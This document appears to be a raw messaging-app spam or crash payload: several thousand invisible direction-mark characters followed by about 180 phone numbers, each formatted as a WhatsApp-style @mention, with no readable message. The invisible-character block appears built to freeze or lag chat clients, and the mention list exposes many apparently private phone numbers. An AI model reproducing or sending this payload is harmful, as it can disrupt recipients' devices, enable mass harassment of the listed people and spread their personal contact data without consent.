‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎
~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ 